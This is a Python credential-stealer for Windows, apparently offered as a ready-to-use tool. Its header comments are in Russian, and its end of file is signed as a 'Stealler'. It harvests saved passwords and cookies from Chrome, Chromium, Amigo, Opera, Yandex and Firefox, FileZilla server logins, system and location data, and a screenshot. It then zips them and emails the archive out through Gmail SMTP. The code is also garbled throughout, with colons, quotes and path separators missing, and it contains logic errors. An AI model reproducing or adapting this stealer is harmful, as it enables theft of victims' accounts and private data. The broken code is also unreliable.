import os
from Crypto.Hash import SHA512
import sqlite3
import win32crypt
import email, ssl
import shutil
import requests
import zipfile
import getpass
import ip2geotools
import win32api
import platform
import tempfile
import smtplib
import time
import cv2
import sys
from PIL import ImageGrab
from email.mime.multipart import MIMEMultipart 
from email.mime.base import MIMEBase 
from email.message import Message
from email.mime.multipart import MIMEBase
from email.mime.text import MIMEText
from email.utils import COMMASPACE, formatdate
from email import encoders
from Tools.demo.mcast import sender
from ip2geotools.databases.noncommercial import DbIpCity
from os.path import basename
from smtplib import SMTP
from email.header import Header
from email.utils import parseaddr, formataddr
from base64 import encodebytes
import random
################################################################################
#                              ВСЕ ДАННЫЕ И ЛОКАЦИЯ                            #
################################################################################
drives = str(win32api.GetLogicalDriveStrings())
drives = str(drives.split('000')[-1])
response = DbIpCity.get(requests.get(httpsramziv.comip).text, api_key='free')
all_data = Time  + time.asctime() + 'n' + Кодировка ФС  + sys.getfilesystemencoding() + 'n' + Cpu  + platform.processor() + 'n' + Система  + platform.system() + ' ' + platform.release() + 'nIP '+requests.get(httpsramziv.comip).text+'nГород '+response.city+'nGen_Location' + response.to_json() + 'nДиски' + drives
file = open(os.getenv(APPDATA) + 'alldata.txt', w+) 
file.write(all_data)
file.close()
################################################################################
#                              GOOGLE PASSWORDS                                #
################################################################################
def Chrome() 
   text = 'Passwords Chrome' + 'n' 
   text += 'URL  LOGIN  PASSWORD' + 'n' 
   if os.path.exists(os.getenv(LOCALAPPDATA) + 'GoogleChromeUser DataDefaultLogin Data') 
       shutil.copy2(os.getenv(LOCALAPPDATA) + 'GoogleChromeUser DataDefaultLogin Data', os.getenv(LOCALAPPDATA) + 'GoogleChromeUser DataDefaultLogin Data2')
       conn = sqlite3.connect(os.getenv(LOCALAPPDATA) + 'GoogleChromeUser DataDefaultLogin Data2') 
       cursor = conn.cursor()
       cursor.execute('SELECT action_url, username_value, password_value FROM logins')
       for result in cursor.fetchall()
           password = win32crypt.CryptUnprotectData(result[2])[1].decode() 
           login = result[1]
           url = result[0]
           if password != ''
               text += url + '  ' + login + '  ' + password + 'n' 
   return text
file = open(os.getenv(APPDATA) + 'google_pass.txt', w+)
file.write(str(Chrome()) + 'n')
file.close()
################################################################################
#                              GOOGLE Cookies                                  #
################################################################################
def Chrome_cockie()
   textc = 'Cookies Chrome' + 'n'
   textc += 'URL  COOKIE  COOKIE NAME' + 'n'
   if os.path.exists(os.getenv(LOCALAPPDATA) + 'GoogleChromeUser DataDefaultCookies')
       shutil.copy2(os.getenv(LOCALAPPDATA) + 'GoogleChromeUser DataDefaultCookies', os.getenv(LOCALAPPDATA) + 'GoogleChromeUser DataDefaultCookies2')
       conn = sqlite3.connect(os.getenv(LOCALAPPDATA) + 'GoogleChromeUser DataDefaultCookies2')
       cursor = conn.cursor()
       cursor.execute(SELECT  from cookies)
       for result in cursor.fetchall()
           cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
           name = result[2]
           url = result[1]
           textc += url + '  ' + str(cookie) + '  ' + name + 'n'
   return textc
file = open(os.getenv(APPDATA) + 'google_cookies.txt', w+) 
file.write(str(Chrome_cockie()) + 'n')
file.close()
################################################################################
#                              FIREFOX Cookies                                 #
################################################################################
def Firefox()
   textf = ''
   textf +='Firefox Cookies' + 'n'
   textf += 'URL  COOKIE  COOKIE NAME' + 'n'
   for root, dirs, files in os.walk(os.getenv(APPDATA) + 'MozillaFirefoxProfiles')
       for name in dirs
           conn = sqlite3.connect(os.path.join(root, name)+'cookies.sqlite')
           cursor = conn.cursor()
           cursor.execute(SELECT baseDomain, value, name FROM moz_cookies)
           data = cursor.fetchall()
           for i in range(len(data))
               url, cookie, name = data[i]
               textf += url + '  ' + str(cookie) + '  ' + name + 'n'     
       break
   return textf
file = open(os.getenv(APPDATA) + 'firefox_cookies.txt', w+)
file.write(str(Firefox()) + 'n')
file.close()
################################################################################
#                              CHROMIUM PASSWORDS                              #
################################################################################
def chromium()
   textch ='Chromium Passwords' + 'n'
   textch += 'URL  LOGIN  PASSWORD' + 'n'
   if os.path.exists(os.getenv(LOCALAPPDATA) + 'ChromiumUser DataDefault')
       shutil.copy2(os.getenv(LOCALAPPDATA) + 'ChromiumUser DataDefaultLogin Data', os.getenv(LOCALAPPDATA) + 'ChromiumUser DataDefaultLogin Data2')
       conn = sqlite3.connect(os.getenv(LOCALAPPDATA) + 'ChromiumUser DataDefaultLogin Data2')
       cursor = conn.cursor()
       cursor.execute('SELECT action_url, username_value, password_value FROM logins')
       for result in cursor.fetchall()
           password = win32crypt.CryptUnprotectData(result[2])[1].decode()
           login = result[1]
           url = result[0]
           if password != ''
               textch += url + '  ' + login + '  ' + password + 'n'
               return textch
file = open(os.getenv(APPDATA) + 'chromium.txt', w+)
file.write(str(chromium()) + 'n')
file.close()
################################################################################
#                              CHROMIUM cookies                                #
################################################################################
def chromiumc()
   textchc = '' 
   textchc +='Chromium Cookies' + 'n'
   textchc += 'URL  COOKIE  COOKIE NAME' + 'n'
   if os.path.exists(os.getenv(LOCALAPPDATA) + 'ChromiumUser DataDefaultCookies')
       shutil.copy2(os.getenv(LOCALAPPDATA) + 'ChromiumUser DataDefaultCookies', os.getenv(LOCALAPPDATA) + 'ChromiumUser DataDefaultCookies2')
       conn = sqlite3.connect(os.getenv(LOCALAPPDATA) + 'ChromiumUser DataDefaultCookies2')
       cursor = conn.cursor()
       cursor.execute(SELECT  from cookies)
       for result in cursor.fetchall()
           cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
           name = result[2]
           url = result[1]
           textchc += url + '  ' + str(cookie) + '  ' + name + 'n'
   return textchc
file = open(os.getenv(APPDATA) + 'chromium_cookies.txt', w+)
file.write(str(chromiumc()) + 'n')
file.close()
################################################################################
#                              AMIGO PASSWORDS                                 #
################################################################################
def Amigo()
   textam = 'Passwords Amigo' + 'n'
   textam += 'URL  LOGIN  PASSWORD' + 'n'
   if os.path.exists(os.getenv(LOCALAPPDATA) + 'AmigoUser DataDefaultLogin Data')
       shutil.copy2(os.getenv(LOCALAPPDATA) + 'AmigoUser DataDefaultLogin Data', os.getenv(LOCALAPPDATA) + 'AmigoUser DataDefaultLogin Data2')
       conn = sqlite3.connect(os.getenv(LOCALAPPDATA) + 'AmigoUser DataDefaultLogin Data2')
       cursor = conn.cursor()
       cursor.execute('SELECT action_url, username_value, password_value FROM logins')
       for result in cursor.fetchall()
           password = win32crypt.CryptUnprotectData(result[2])[1].decode()
           login = result[1]
           url = result[0]
           if password != ''
               textam += url + '  ' + login + '  ' + password + 'n'
file = open(os.getenv(APPDATA) + 'amigo_pass.txt', w+)
file.write(str(Amigo()) + 'n')
file.close()
################################################################################
#                              AMIGO cookies                                   #
################################################################################
def Amigo_c()
   textamc = 'Cookies Amigo' + 'n'
   textamc += 'URL  COOKIE  COOKIE NAME' + 'n'
   if os.path.exists(os.getenv(LOCALAPPDATA) + 'AmigoUser DataDefaultCookies')
       shutil.copy2(os.getenv(LOCALAPPDATA) + 'AmigoUser DataDefaultCookies', os.getenv(LOCALAPPDATA) + 'AmigoUser DataDefaultCookies2')
       conn = sqlite3.connect(os.getenv(LOCALAPPDATA) + 'AmigoUser DataDefaultCookies2')
       cursor = conn.cursor()
       cursor.execute(SELECT  from cookies)
       for result in cursor.fetchall()
           cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
           name = result[2]
           url = result[1]
           textamc += url + '  ' + str(cookie) + '  ' + name + 'n'
   return textamc
file = open(os.getenv(APPDATA) + 'amigo_cookies.txt', w+)
file.write(str(Amigo_c()) + 'n')
file.close()
################################################################################
#                              OPERA PASSWORDS                                 #
################################################################################
def Opera()
   texto = 'Passwords Opera' + 'n'
   texto += 'URL  LOGIN  PASSWORD' + 'n'
   if os.path.exists(os.getenv(APPDATA) + 'Opera SoftwareOpera StableLogin Data')
       shutil.copy2(os.getenv(APPDATA) + 'Opera SoftwareOpera StableLogin Data', os.getenv(APPDATA) + 'Opera SoftwareOpera StableLogin Data2')
       conn = sqlite3.connect(os.getenv(APPDATA) + 'Opera SoftwareOpera StableLogin Data2')
       cursor = conn.cursor()
       cursor.execute('SELECT action_url, username_value, password_value FROM logins')
       for result in cursor.fetchall()
           password = win32crypt.CryptUnprotectData(result[2])[1].decode()
           login = result[1]
           url = result[0]
           if password != ''
               texto += url + '  ' + login + '  ' + password + 'n'
file = open(os.getenv(APPDATA) + 'opera_pass.txt', w+)
file.write(str(Opera()) + 'n')
file.close()
################################################################################
#                              FIREFOX PASSWORDS                               #
################################################################################
def Firefox_cookies()
   texto = 'Passwords firefox' + 'n'
   texto += 'URL  LOGIN  PASSWORD' + 'n'
   if os.path.exists(os.getenv(APPDATA) + 'AppDataRoamingMozillaFirefox')
       shutil.copy2(os.getenv(APPDATA) + 'AppDataRoamingMozillaFirefox2', os.getenv(APPDATA) + 'AppDataRoamingMozillaFirefox2')
       conn = sqlite3.connect(os.getenv(APPDATA) + 'AppDataRoamingMozillaFirefox2')
       cursor = conn.cursor()
       cursor.execute('SELECT action_url, username_value, password_value FROM logins')
       for result in cursor.fetchall()
           password = win32crypt.CryptUnprotectData(result[2])[1].decode()
           login = result[1]
           url = result[0]
           if password != ''
               texto += url + '  ' + login + '  ' + password + 'n'
file = open(os.getenv(APPDATA) + 'firefox_pass.txt', w+)
file.write(str(Firefox_cookies()) + 'n')
file.close()
################################################################################
#                              YANDEX PASSWORDS                                #
################################################################################
def Yandexpass()
    textyp = 'Passwords Yandex' + 'n'
    textyp += 'URL  LOGIN  PASSWORD' + 'n'
    if os.path.exists(os.getenv(LOCALAPPDATA) + 'YandexYandexBrowserUser DataDefaultYa Login Data.db')
        shutil.copy2(os.getenv(LOCALAPPDATA) + 'YandexYandexBrowserUser DataDefaultYa Login Data.db', os.getenv(LOCALAPPDATA) + 'YandexYandexBrowserUser DataDefaultYa Login Data2.db')
        conn = sqlite3.connect(os.getenv(LOCALAPPDATA) + 'YandexeYandexBrowserUser DataDefaultYa Login Data2.db')
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        for result in cursor.fetchall()
            password = win32crypt.CryptUnprotectData(result[2])[1].decode()
            login = result[1]
            url = result[0]
            if password != ''
                textyp += url + '  ' + login + '  ' + password + 'n'
    return textyp
file = open(os.getenv(APPDATA) + 'yandex_passwords.txt', w+)
file.write(str(Yandexpass()) + 'n')
file.close()
################################################################################
#                             OPERA cookies                                    #
################################################################################
def Opera_c()
    textoc ='Cookies Opera' + 'n'
    textoc += 'URL  COOKIE  COOKIE NAME' + 'n'
    if os.path.exists(os.getenv(LOCALAPPDATA) + 'GoogleChromeUser DataDefaultCookies')
      shutil.copy2(os.getenv(LOCALAPPDATA) + 'GoogleChromeUser DataDefaultCookies', os.getenv(LOCALAPPDATA) + 'GoogleChromeUser DataDefaultCookies2')
      conn = sqlite3.connect(os.getenv(LOCALAPPDATA) + 'GoogleChromeUser DataDefaultCookies2')
      cursor = conn.cursor()
      cursor.execute(SELECT  from cookies)
      for result in cursor.fetchall()
           cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
           name = result[2]
           url = result[1]
           textoc += url + '  ' + str(cookie) + '  ' + name + 'n'
    return textoc
file = open(os.getenv(APPDATA) + 'opera_cookies.txt', w+)
file.write(str(Opera_c()) + 'n')
file.close()
################################################################################
#                             FILEZILLA                                        #
################################################################################
def filezilla()
   try
       data = ''
       if os.path.isfile(os.getenv(APPDATA) + 'FileZillarecentservers.xml') is True
           root = etree.parse(os.getenv(APPDATA) + 'FileZillarecentservers.xml').getroot()

           for i in range(len(root[0]))
               host = root[0][i][0].text
               port = root[0][i][1].text
               user = root[0][i][4].text
               password = base64.b64decode(root[0][i][5].text).decode('utf-8')
               data += 'host ' + host + 'port ' + port + 'user ' + user + 'pass ' + password + 'n'
           return data
       else
           return 'Not found'
   except Exception
       return 'Error'
textfz = filezilla()
textfz += 'Filezilla ' + 'n' + filezilla() + 'n'
file = open(os.getenv(APPDATA) + 'filezilla.txt', w+)
file.write(str(filezilla()) + 'n')
file.close()
################################################################################
#                             SCREEN                                           #
################################################################################
screen = ImageGrab.grab()
screen.save(os.getenv(APPDATA) + 'sreenshot.jpg')
################################################################################
#                              PACKING TO ZIP                                  #
################################################################################
zname = r'CUsers' + getpass.getuser() + 'AppDataLocalTempLOG.zip'
NZ = zipfile.ZipFile(zname,'w')
NZ.write(r'CUsers' + getpass.getuser() + 'AppDataRoamingfirefox_pass.txt')
NZ.write(r'CUsers' + getpass.getuser() + 'AppDataRoamingfirefox_cookies.txt')
NZ.write(r'CUsers' + getpass.getuser() + 'AppDataRoamingyandex_passwords.txt')
NZ.write(r'CUsers' + getpass.getuser() + 'AppDataRoamingalldata.txt')
NZ.write(r'CUsers' + getpass.getuser() + 'AppDataRoaminggoogle_pass.txt')
NZ.write(r'CUsers' + getpass.getuser() + 'AppDataRoaminggoogle_cookies.txt')
NZ.write(r'CUsers' + getpass.getuser() + 'AppDataRoamingchromium.txt')
NZ.write(r'CUsers' + getpass.getuser() + 'AppDataRoamingchromium_cookies.txt')
NZ.write(r'CUsers' + getpass.getuser() + 'AppDataRoamingamigo_pass.txt')
NZ.write(r'CUsers' + getpass.getuser() + 'AppDataRoamingamigo_cookies.txt')
NZ.write(r'CUsers' + getpass.getuser() + 'AppDataRoamingopera_pass.txt')
NZ.write(r'CUsers' + getpass.getuser() + 'AppDataRoamingopera_cookies.txt')
NZ.write(r'CUsers' + getpass.getuser() + 'AppDataRoamingfilezilla.txt')
NZ.write(r'CUsers' + getpass.getuser() + 'AppDataRoamingsreenshot.jpg')
NZ.close() 
################################################################################
#                              DOC-НАШ ZIP                                     #
################################################################################
doc = 'CUsers' + getpass.getuser() + 'AppDataLocalTempLOG.zip'
################################################################################
#                              ОТПРАВКА                                        #
################################################################################
'↑Stealler by Andrew_Shipunov↑'.encode('utf-8')
msgtext = MIMEText('↑Stealler by Andrew_Shipunov↑'.encode('utf-8'), 'plain', 'utf-8')
msg = MIMEMultipart()
msg['From'] = 'ваша новая почта@gmail.com'
msg['To'] = 'почта куда отправится'
msg['Subject'] = getpass.getuser() + '-PC'
msg.attach(msgtext)
################################################################################
#                              СОЗДАНИЕ ВЛОЖЕНИЯ                               #
################################################################################
part = MIMEBase('application', zip)
b = open(doc, rb).read()
bs = encodebytes(b).decode()
part.set_payload(bs)
part.add_header('Content-Transfer-Encoding', 'base64')
part.add_header('Content-Disposition', 'attachment; filename=LOG.zip')
msg.attach(part)
################################################################################
#                              ОТПРАВКА вам       #
################################################################################
s = smtplib.SMTP('smtp.gmail.com', 587)
s.starttls()                                   
s.login('новая ваша почта гмаил', 'пароль от новой почты гмаил')
s.sendmail('новая ваша почта гмаил', 'почта куда отправится', msg.as_string())
s.quit()
i = input()